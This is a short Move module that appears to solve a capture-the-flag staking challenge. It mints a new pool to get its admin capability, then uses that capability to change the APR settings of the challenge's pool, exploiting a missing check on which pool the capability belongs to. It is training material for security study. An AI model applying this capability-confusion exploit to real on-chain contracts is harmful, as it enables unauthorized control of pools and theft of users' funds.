module the_solution::solution;

use challenge::challenge::Challenge;
use challenge::coin::COIN;
use challenge::staking;

const NEW_APR_DECIMALS: u8 = 18;

#[allow(lint(self_transfer))]
public fun solve(challenge: &mut Challenge<COIN>, ctx: &mut TxContext) {
    let coins = challenge.claim_coin(ctx);

    // create new pool with any settings to get admin cap
    let (new_pool, new_admin_cap) = staking::create<COIN>(
        100,
        2,
        1,
        1,
        1,
        1,
        coins,
        ctx,
    );

    // set apr with 18 decimals, which equals to previous one to avoid rewards change
    let pool = challenge.get_pool();
    let (apr, apr_base) = pool.get_apr();

    let new_apr =
        ((apr as u128) * (10u64.pow(NEW_APR_DECIMALS) as u128) / (apr_base as u128)) as u64;
    pool.update_apr(&new_admin_cap, new_apr, NEW_APR_DECIMALS);

    transfer::public_transfer(new_pool, ctx.sender());
    transfer::public_transfer(new_admin_cap, ctx.sender());
}
